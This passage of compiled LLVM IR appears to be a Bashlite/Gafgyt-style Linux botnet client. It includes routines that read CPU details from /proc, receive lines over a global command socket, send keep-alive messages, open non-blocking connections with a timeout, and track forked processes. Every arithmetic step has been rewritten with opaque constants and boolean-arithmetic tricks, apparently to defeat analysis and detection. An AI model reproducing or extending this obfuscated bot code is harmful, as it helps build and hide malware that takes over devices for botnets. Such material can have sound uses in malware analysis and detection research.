  %105 = load i8*, i8** %4, align 8
  %106 = getelementptr inbounds i8, i8* %105, i64 1
  %107 = load i8*, i8** %5, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i32 @wildString(i8* %106, i8* %108)
  %110 = icmp ne i32 %109, 0
  %111 = xor i1 %110, true
  %112 = and i1 true, %111
  %113 = xor i1 true, true
  %114 = and i1 %110, %113
  %115 = or i1 %112, %114
  %116 = xor i1 %110, true
  br label %117

; <label>:117:                                    ; preds = %104, %94
  %118 = phi i1 [ false, %94 ], [ %115, %104 ]
  %119 = xor i1 %118, true
  %120 = and i1 true, %119
  %121 = xor i1 true, true
  %122 = and i1 %118, %121
  %123 = xor i1 true, true
  %124 = and i1 %123, true
  %125 = and i1 true, %121
  %126 = or i1 %120, %122
  %127 = or i1 %124, %125
  %128 = xor i1 %126, %127
  %129 = xor i1 %118, true
  %130 = zext i1 %128 to i32
  store i32 %130, i32* %3, align 4
  br label %131

; <label>:131:                                    ; preds = %117, %80, %43, %9
  %132 = load i32, i32* %3, align 4
  ret i32 %132
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %91, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %93

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %91

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %69, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = sub i64 %46, -1654732401893032624
  %48 = sub i64 %47, 1
  %49 = add i64 %48, -1654732401893032624
  %50 = sub i64 %46, 1
  %51 = getelementptr inbounds i8, i8* %44, i64 %49
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 13
  br i1 %54, label %67, label %55

; <label>:55:                                     ; preds = %43
  %56 = load i8*, i8** %6, align 8
  %57 = load i8*, i8** %6, align 8
  %58 = call i64 @strlen(i8* %57) #10
  %59 = sub i64 %58, -3843311844796652487
  %60 = sub i64 %59, 1
  %61 = add i64 %60, -3843311844796652487
  %62 = sub i64 %58, 1
  %63 = getelementptr inbounds i8, i8* %56, i64 %61
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 10
  br label %67

; <label>:67:                                     ; preds = %55, %43
  %68 = phi i1 [ true, %43 ], [ %66, %55 ]
  br i1 %68, label %69, label %78

; <label>:69:                                     ; preds = %67
  %70 = load i8*, i8** %6, align 8
  %71 = load i8*, i8** %6, align 8
  %72 = call i64 @strlen(i8* %71) #10
  %73 = add i64 %72, 2607293930220577161
  %74 = sub i64 %73, 1
  %75 = sub i64 %74, 2607293930220577161
  %76 = sub i64 %72, 1
  %77 = getelementptr inbounds i8, i8* %70, i64 %75
  store i8 0, i8* %77, align 1
  br label %43

; <label>:78:                                     ; preds = %67
  %79 = load i8*, i8** %6, align 8
  %80 = call i8* @strchr(i8* %79, i32 46) #10
  %81 = icmp ne i8* %80, null
  br i1 %81, label %82, label %85

; <label>:82:                                     ; preds = %78
  %83 = load i8*, i8** %6, align 8
  %84 = call i8* @strchr(i8* %83, i32 46) #10
  store i8 0, i8* %84, align 1
  br label %85

; <label>:85:                                     ; preds = %82, %78
  %86 = load i8*, i8** %3, align 8
  %87 = load i8*, i8** %6, align 8
  %88 = call i8* @strcpy(i8* %86, i8* %87) #2
  %89 = load i32, i32* %4, align 4
  %90 = call i32 @close(i32 %89)
  store i32 0, i32* %2, align 4
  br label %96

; <label>:91:                                     ; preds = %13
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %92, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:93:                                     ; preds = %8
  %94 = load i32, i32* %4, align 4
  %95 = call i32 @close(i32 %94)
  store i32 1, i32* %2, align 4
  br label %96

; <label>:96:                                     ; preds = %93, %85
  %97 = load i32, i32* %2, align 4
  ret i32 %97
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %22, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %24

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %22

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add i32 %17, 1640393131
  %19 = add i32 %18, 1
  %20 = sub i32 %19, 1640393131
  %21 = add nsw i32 %17, 1
  store i32 %20, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %16, %10
  %23 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:24:                                     ; preds = %5
  %25 = load i32, i32* %2, align 4
  %26 = call i32 @close(i32 %25)
  %27 = load i32, i32* %1, align 4
  ret i32 %27
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %21, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %26

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 0, 65
  %14 = sub i32 %12, %13
  %15 = add i32 %12, 65
  %16 = trunc i32 %14 to i8
  %17 = load i8*, i8** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  store i8 %16, i8* %20, align 1
  br label %21

; <label>:21:                                     ; preds = %10
  %22 = load i32, i32* %5, align 4
  %23 = sub i32 0, 1
  %24 = sub i32 %22, %23
  %25 = add nsw i32 %22, 1
  store i32 %24, i32* %5, align 4
  br label %6

; <label>:26:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = and i64 %43, %37
  %45 = xor i64 %43, %37
  %46 = or i64 %44, %45
  %47 = or i64 %43, %37
  store i64 %46, i64* %42, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sub i32 0, 1
  %50 = sub i32 %48, %49
  %51 = add nsw i32 %48, 1
  %52 = call i32 @select(i32 %50, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %52, i32* %12, align 4
  %53 = icmp sle i32 %52, 0
  br i1 %53, label %54, label %115

; <label>:54:                                     ; preds = %33
  br label %55

; <label>:55:                                     ; preds = %106, %54
  %56 = load i32, i32* %13, align 4
  %57 = icmp slt i32 %56, 10
  br i1 %57, label %58, label %114

; <label>:58:                                     ; preds = %55
  %59 = load i32, i32* @mainCommSock, align 4
  %60 = call i32 (i32, i8*, ...) @sockprintf(i32 %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0))
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %62, align 8
  br label %63

; <label>:63:                                     ; preds = %58
  %64 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %65 = getelementptr inbounds [16 x i64], [16 x i64]* %64, i64 0, i64 0
  %66 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %65) #2, !srcloc !2
  %67 = extractvalue { i64, i64* } %66, 0
  %68 = extractvalue { i64, i64* } %66, 1
  %69 = trunc i64 %67 to i32
  store i32 %69, i32* %14, align 4
  %70 = ptrtoint i64* %68 to i64
  %71 = trunc i64 %70 to i32
  store i32 %71, i32* %15, align 4
  br label %72

; <label>:72:                                     ; preds = %63
  %73 = load i32, i32* %5, align 4
  %74 = srem i32 %73, 64
  %75 = zext i32 %74 to i64
  %76 = shl i64 1, %75
  %77 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %78 = load i32, i32* %5, align 4
  %79 = sdiv i32 %78, 64
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [16 x i64], [16 x i64]* %77, i64 0, i64 %80
  %82 = load i64, i64* %81, align 8
  %83 = xor i64 %82, -1
  %84 = xor i64 %76, -1
  %85 = xor i64 -9171991880556992701, -1
  %86 = and i64 %83, -9171991880556992701
  %87 = and i64 %82, %85
  %88 = and i64 %84, -9171991880556992701
  %89 = and i64 %76, %85
  %90 = or i64 %86, %87
  %91 = or i64 %88, %89
  %92 = xor i64 %90, %91
  %93 = or i64 %83, %84
  %94 = xor i64 %93, -1
  %95 = or i64 -9171991880556992701, %85
  %96 = and i64 %94, %95
  %97 = or i64 %92, %96
  %98 = or i64 %82, %76
  store i64 %97, i64* %81, align 8
  %99 = load i32, i32* %5, align 4
  %100 = add i32 %99, 1305092446
  %101 = add i32 %100, 1
  %102 = sub i32 %101, 1305092446
  %103 = add nsw i32 %99, 1
  %104 = call i32 @select(i32 %102, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %104, i32* %12, align 4
  %105 = icmp sle i32 %104, 0
  br i1 %105, label %106, label %113

; <label>:106:                                    ; preds = %72
  %107 = load i32, i32* %13, align 4
  %108 = sub i32 0, %107
  %109 = sub i32 0, 1
  %110 = add i32 %108, %109
  %111 = sub i32 0, %110
  %112 = add nsw i32 %107, 1
  store i32 %111, i32* %13, align 4
  br label %55

; <label>:113:                                    ; preds = %72
  br label %114

; <label>:114:                                    ; preds = %113, %55
  br label %115

; <label>:115:                                    ; preds = %114, %33
  store i32 0, i32* %18, align 4
  %116 = load i8*, i8** %6, align 8
  store i8* %116, i8** %17, align 8
  br label %117

; <label>:117:                                    ; preds = %138, %115
  %118 = load i32, i32* %7, align 4
  %119 = sub i32 %118, -1615200928
  %120 = add i32 %119, -1
  %121 = add i32 %120, -1615200928
  %122 = add nsw i32 %118, -1
  store i32 %121, i32* %7, align 4
  %123 = icmp sgt i32 %118, 1
  br i1 %123, label %124, label %145

; <label>:124:                                    ; preds = %117
  %125 = load i32, i32* @mainCommSock, align 4
  %126 = call i64 @recv(i32 %125, i8* %16, i64 1, i32 0)
  %127 = icmp ne i64 %126, 1
  br i1 %127, label %128, label %130

; <label>:128:                                    ; preds = %124
  %129 = load i8*, i8** %17, align 8
  store i8 0, i8* %129, align 1
  store i32 -1, i32* %4, align 4
  br label %148

; <label>:130:                                    ; preds = %124
  %131 = load i8, i8* %16, align 1
  %132 = load i8*, i8** %17, align 8
  %133 = getelementptr inbounds i8, i8* %132, i32 1
  store i8* %133, i8** %17, align 8
  store i8 %131, i8* %132, align 1
  %134 = load i8, i8* %16, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 10
  br i1 %136, label %137, label %138

; <label>:137:                                    ; preds = %130
  br label %145

; <label>:138:                                    ; preds = %130
  %139 = load i32, i32* %18, align 4
  %140 = sub i32 0, %139
  %141 = sub i32 0, 1
  %142 = add i32 %140, %141
  %143 = sub i32 0, %142
  %144 = add nsw i32 %139, 1
  store i32 %143, i32* %18, align 4
  br label %117

; <label>:145:                                    ; preds = %137, %117
  %146 = load i8*, i8** %17, align 8
  store i8 0, i8* %146, align 1
  %147 = load i32, i32* %18, align 4
  store i32 %147, i32* %4, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %128
  %149 = load i32, i32* %4, align 4
  ret i32 %149
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = xor i64 %22, -1
  %24 = xor i64 2048, -1
  %25 = xor i64 -8259869962519222974, -1
  %26 = and i64 %23, -8259869962519222974
  %27 = and i64 %22, %25
  %28 = and i64 %24, -8259869962519222974
  %29 = and i64 2048, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 -8259869962519222974, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %22, 2048
  store i64 %37, i64* %15, align 8
  %39 = load i32, i32* %6, align 4
  %40 = load i64, i64* %15, align 8
  %41 = call i32 (i32, i32, ...) @fcntl(i32 %39, i32 4, i64 %40)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %8, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i8*, i8** %7, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %140

; <label>:52:                                     ; preds = %4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %6, align 4
  %56 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %57 = call i32 @connect(i32 %55, %struct.sockaddr* %56, i32 16)
  store i32 %57, i32* %16, align 4
  %58 = load i32, i32* %16, align 4
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %124

; <label>:60:                                     ; preds = %52
  %61 = call i32* @__errno_location() #13
  %62 = load i32, i32* %61, align 4
  %63 = icmp eq i32 %62, 115
  br i1 %63, label %64, label %122

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %66, i64* %67, align 8
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %68, align 8
  br label %69

; <label>:69:                                     ; preds = %64
  %70 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %71 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 0
  %72 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %71) #2, !srcloc !3
  %73 = extractvalue { i64, i64* } %72, 0
  %74 = extractvalue { i64, i64* } %72, 1
  %75 = trunc i64 %73 to i32
  store i32 %75, i32* %17, align 4
  %76 = ptrtoint i64* %74 to i64
  %77 = trunc i64 %76 to i32
  store i32 %77, i32* %18, align 4
  br label %78

; <label>:78:                                     ; preds = %69
  %79 = load i32, i32* %6, align 4
  %80 = srem i32 %79, 64
  %81 = zext i32 %80 to i64
  %82 = shl i64 1, %81
  %83 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %84 = load i32, i32* %6, align 4
  %85 = sdiv i32 %84, 64
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 %86
  %88 = load i64, i64* %87, align 8
  %89 = xor i64 %88, -1
  %90 = xor i64 %82, -1
  %91 = xor i64 -118003365698008595, -1
  %92 = and i64 %89, -118003365698008595
  %93 = and i64 %88, %91
  %94 = and i64 %90, -118003365698008595
  %95 = and i64 %82, %91
  %96 = or i64 %92, %93
  %97 = or i64 %94, %95
  %98 = xor i64 %96, %97
  %99 = or i64 %89, %90
  %100 = xor i64 %99, -1
  %101 = or i64 -118003365698008595, %91
  %102 = and i64 %100, %101
  %103 = or i64 %98, %102
  %104 = or i64 %88, %82
  store i64 %103, i64* %87, align 8
  %105 = load i32, i32* %6, align 4
  %106 = add i32 %105, -492778974
  %107 = add i32 %106, 1
  %108 = sub i32 %107, -492778974
  %109 = add nsw i32 %105, 1
  %110 = call i32 @select(i32 %108, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %111 = icmp sgt i32 %110, 0
  br i1 %111, label %112, label %120

; <label>:112:                                    ; preds = %78
  store i32 4, i32* %13, align 4
  %113 = load i32, i32* %6, align 4
  %114 = bitcast i32* %14 to i8*
  %115 = call i32 @getsockopt(i32 %113, i32 1, i32 4, i8* %114, i32* %13) #2
  %116 = load i32, i32* %14, align 4
  %117 = icmp ne i32 %116, 0
  br i1 %117, label %118, label %119

; <label>:118:                                    ; preds = %112
  store i32 0, i32* %5, align 4
  br label %140

; <label>:119:                                    ; preds = %112
  br label %121

; <label>:120:                                    ; preds = %78
  store i32 0, i32* %5, align 4
  br label %140

; <label>:121:                                    ; preds = %119
  br label %123

; <label>:122:                                    ; preds = %60
  store i32 0, i32* %5, align 4
  br label %140

; <label>:123:                                    ; preds = %121
  br label %124

; <label>:124:                                    ; preds = %123, %52
  %125 = load i32, i32* %6, align 4
  %126 = call i32 (i32, i32, ...) @fcntl(i32 %125, i32 3, i8* null)
  %127 = sext i32 %126 to i64
  store i64 %127, i64* %15, align 8
  %128 = load i64, i64* %15, align 8
  %129 = xor i64 %128, -1
  %130 = xor i64 -2049, -1
  %131 = xor i64 -5207793237244362196, -1
  %132 = or i64 %129, %130
  %133 = or i64 -5207793237244362196, %131
  %134 = xor i64 %132, -1
  %135 = and i64 %134, %133
  %136 = and i64 %128, -2049
  store i64 %135, i64* %15, align 8
  %137 = load i32, i32* %6, align 4
  %138 = load i64, i64* %15, align 8
  %139 = call i32 (i32, i32, ...) @fcntl(i32 %137, i32 4, i64 %138)
  store i32 1, i32* %5, align 4
  br label %140

; <label>:140:                                    ; preds = %124, %122, %120, %118, %51
  %141 = load i32, i32* %5, align 4
  ret i32 %141
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %62

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 0, %11
  %13 = sub i64 0, 1
  %14 = add i64 %12, %13
  %15 = sub i64 0, %14
  %16 = add i64 %11, 1
  store i64 %15, i64* @numpids, align 8
  %17 = load i64, i64* @numpids, align 8
  %18 = sub i64 0, %17
  %19 = sub i64 0, 1
  %20 = add i64 %18, %19
  %21 = sub i64 0, %20
  %22 = add i64 %17, 1
  %23 = mul i64 %21, 4
  %24 = call noalias i8* @malloc(i64 %23) #2
  %25 = bitcast i8* %24 to i32*
  store i32* %25, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %26

; <label>:26:                                     ; preds = %45, %10
  %27 = load i32, i32* %4, align 4
  %28 = zext i32 %27 to i64
  %29 = load i64, i64* @numpids, align 8
  %30 = add i64 %29, 7236871194553676806
  %31 = sub i64 %30, 1
  %32 = sub i64 %31, 7236871194553676806
  %33 = sub i64 %29, 1
  %34 = icmp ult i64 %28, %32
  br i1 %34, label %35, label %50

; <label>:35:                                     ; preds = %26
  %36 = load i32*, i32** @pids, align 8
  %37 = load i32, i32* %4, align 4
  %38 = zext i32 %37 to i64
  %39 = getelementptr inbounds i32, i32* %36, i64 %38
  %40 = load i32, i32* %39, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i32, i32* %4, align 4
  %43 = zext i32 %42 to i64
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  br label %45

; <label>:45:                                     ; preds = %35
  %46 = load i32, i32* %4, align 4
  %47 = sub i32 0, 1
  %48 = sub i32 %46, %47
  %49 = add i32 %46, 1
  store i32 %48, i32* %4, align 4
  br label %26

; <label>:50:                                     ; preds = %26
  %51 = load i32, i32* %2, align 4
